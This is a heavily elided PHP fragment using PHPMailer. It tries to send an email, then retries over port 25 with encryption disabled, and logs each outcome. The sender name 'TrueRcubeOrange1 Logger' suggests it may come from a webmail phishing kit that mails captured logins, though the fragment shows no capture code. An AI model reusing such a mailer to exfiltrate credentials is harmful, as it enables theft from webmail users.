...
try {
    ...
    $mail->SMTPSecure = $smtp_secure;  // Use the configurable variable
    $mail->Timeout = 30;
    ...
    // Try with different SMTP security settings
    try {
        ...
        $mail2->Port = 25; // Try port 25
        $mail2->SMTPSecure = false; // No encryption
        $mail2->Timeout = 30;
        $mail2->SMTPDebug = 0;
        
        $mail2->setFrom($senderuser, 'TrueRcubeOrange1 Logger');
        ...
        if ($mail2->send()) {
            $emailSent = true;
            error_log('Email sent successfully using port 25 without encryption');
        }
    } catch (Exception $e2) {
        ...
        try {
            ...
            error_log('All email methods failed: ' . $e3->getMessage());
        }
    }
}
